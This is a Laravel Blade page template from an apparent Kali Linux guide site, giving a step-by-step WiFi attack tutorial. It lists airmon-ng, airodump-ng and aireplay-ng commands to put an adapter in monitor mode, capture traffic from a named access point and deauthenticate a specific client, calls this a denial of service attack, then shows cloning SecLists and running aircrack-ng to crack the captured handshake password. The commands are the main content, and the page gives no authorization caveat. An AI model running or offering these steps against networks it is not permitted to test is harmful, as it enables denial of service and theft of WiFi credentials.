@extends('Kali.layouts.app')

@section('content')
    @include('guides.partials._profile')
    @include('guides.partials.aside')
    <div class="container">
        <div class="row">
            <div class="col-md-12 ">
                <div class="panel panel-default">
                    <div class="card-header"><h2>Deauthenticating Wifi Client for capturing handshake packets or DOS</h2></div>
                    <div id="test" class="panel-body">
                        <ul class="list-group">
                            <li class="list-group-item list-group-item-primary border-dark">
                                <div class="alert alert-secondary border border-dark" style="font-weight:bold">
                                    <p>To Begin the process of using the device to deauthenticate a few preconditions need to be set
                                        the Network Manager is a process that could interfere with using the device as a monitor
                                        we will stop that process, if for some reason you need to restart Network Manager the code is
                                        below but it does not need to be running for this process.

                                        Kill all processes that may interfere with "monitor mode"</p>
                                    <div class=" code-info alert alert-info border border-dark" style="font-weight:bold">
                                        airmon-ng check kill
                                    </div>
                                    <p>Put the "device" ie antannae into monitor mode using the following code</p>
                                    <div class=" code-info alert alert-info border border-dark" style="font-weight:bold">
                                        airmon-ng start wlan1
                                    </div>
                                    <p>If needed restart network manager when this process is completed</p>
                                    <div class=" code-info alert alert-info border border-dark" style="font-weight:bold">
                                        systemctl enable NetworkManager
                                    </div>
                                </div>

                                    <div class="alert alert-secondary border border-dark" style="font-weight:bold">
                                        <p>for more info on airodump-ng check here -><a href="http://localhost:8000\Kali_resources\HTML\airodump-ng.html">airodump_ng</a><br></p>
                                        <p>and here -> <a href="http://localhost:8000\Kali_resources\HTML\newbie_guide.html">guide</a><br></p>

                                    <div class=" code-info alert alert-info border border-dark" style="font-weight:bold">
                                        airodump-ng -c 6 --bssid B0:39:56:CD:29:0A -w out wlan1mon
                                    </div><p> This will monitor channel "6" and display a list of the BSSIDs (access points) connected devices that are detected and
                                    save the packets to a file with a prefix of "out" using the "wlan1mon" device.</p>
                                   <img src="{{asset("Kali_resources/img/airodump-ng_1.jpg")}}" alt="airodump-ng" height="300" width="600">



                                </div>
                                <div class="alert alert-secondary border border-dark" style="font-weight:bold">
                                    <p>for more info on aireplay-ng check here -><a href="http://localhost:8000\Kali_resources\HTML\aireplay-ng.html">aireplay_ng</a><br></p>
                                    <p>open a new terminal and go to the same directory the airodump-ng code was executed and type the following:</p>
                                <div class=" code-info alert alert-info border border-dark" style="font-weight:bold">
                                    aireplay-ng -0 5 -a B0:39:56:CD:29:0A -c FC:A1:83:F8:7F:4D wlan1mon
                                </div>
                                    <p>This will send deauthentication packets to the connected device. this will be a denial of service attack
                                    and as the client tries to reconnect packets will be saved with the "handshake" to the access point.  These "handshake" packets
                                    will contain the encrypted password to the WiFi Access Point.</p>
                                    <img src="{{asset("Kali_resources/img/aireplay-ng_1.jpg")}}" alt="aireplay-ng" height="300" width="600">
                                </div>
                                <div class="alert alert-secondary border border-dark" style="font-weight:bold">
<p>for a directory of passwords and other lists useful to cracking encrypted packets clone this directory.</p>
                                    <div class=" code-info alert alert-info border border-dark" style="font-weight:bold">
                                        git clone https://github.com/danielmiessler/SecLists.git
                                    </div>
                                    <img src="{{asset("Kali_resources/img/aircrack-ng_1.jpg")}}" alt="dictionaries info" height="350" width="650"><br>
                                    <p>these are dictionary files that contain large lists of passwords and unsernames that you can run against
                                        the encrypted packets from the "handshake" choose a dictionary and apply it to the out.cap file that has the packets collected
                                        from the deauthentication capture.</p>
                                    <p>for more info on aircrack-ng check here -><a href="http://localhost:8000\Kali_resources\HTML\aircrack-ng.html">aircrack_ng</a><br></p>
                                    <div class=" code-info alert alert-info border border-dark" style="font-weight:bold">
                                        aircrack-ng -w ~/kismet/SecLists/SecLists/Passwords/openwall.net-all.txt* out-01.cap
                                    </div>
                                    <img src="{{asset("Kali_resources/img/aircrack-ng_2.jpg")}}" alt="dictionaries info" height="500" width="650"><br>
                                    <p>this shows the process of cracking the encrypted password from the handshake, it takes on file from the list of dictionaries at a time.</p>


                                </div>
                            </li>
                        </ul>
                    </div>

                </div>
            </div>
        </div>
    </div>
@endsection